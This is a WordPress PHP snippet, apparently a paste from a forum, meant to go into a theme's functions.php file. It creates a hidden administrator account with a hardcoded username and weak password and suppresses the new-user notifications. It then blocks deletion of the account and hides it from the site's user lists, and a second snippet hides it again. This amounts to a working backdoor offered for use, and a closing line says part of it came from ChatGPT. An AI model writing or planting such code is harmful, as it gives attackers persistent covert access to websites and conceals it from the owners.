// Create an administrator user and make it undeletable without notifying the main admin
//Pastle this code in theme function.php folder.

function create_undeletable_admin_user() {
    remove_action('user_register', 'wp_send_new_user_notifications');

    $username = 'hidden_admin'; // Change this to desired username
    $password = 'hidden_admin'; // Change this to desired password
    $email = 'moviename62@gmail.com'; // Change this to desired email

    // Check if user with the same username exists
    if (username_exists($username)) {
        return;
    }

    // Create the user
    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
        // Handle error if user creation fails
        return;
    }

    // Get the user object
    $user = new WP_User($user_id);

    // Add administrator capabilities
    $user->set_role('administrator');

    // Make user undeletable
    add_filter('map_meta_cap', 'undeletable_admin_user', 10, 4);
    function undeletable_admin_user($caps, $cap, $user_id, $args) {
        if ($cap === 'delete_user') {
            $user = get_userdata($user_id);
            if ($user && $user->user_login === 'hidden_admin') {
                $caps[] = 'do_not_allow';
            }
        }
        return $caps;
    }

    // Hide user from front end
    add_action('pre_user_query', 'hide_admin_user', 10, 1);
    function hide_admin_user($user_query) {
        $admin_username = 'hidden_admin'; // Change this to the username of the hidden admin user
        global $wpdb;
        $user_query->query_where .= " AND {$wpdb->users}.user_login != '{$admin_username}' ";
    }

    add_action('user_register', 'wp_send_new_user_notifications');
}
add_action('init', 'create_undeletable_admin_user');

//google code
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
  
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'hidden_admin'",$user_search->query_where);
  
}


First code collect form the chatgpt and 2nd code “//google code” collect from the https://stackoverflow.com/questions/71081426/hide-a-specific-admin-account-from-wordpress-user-list
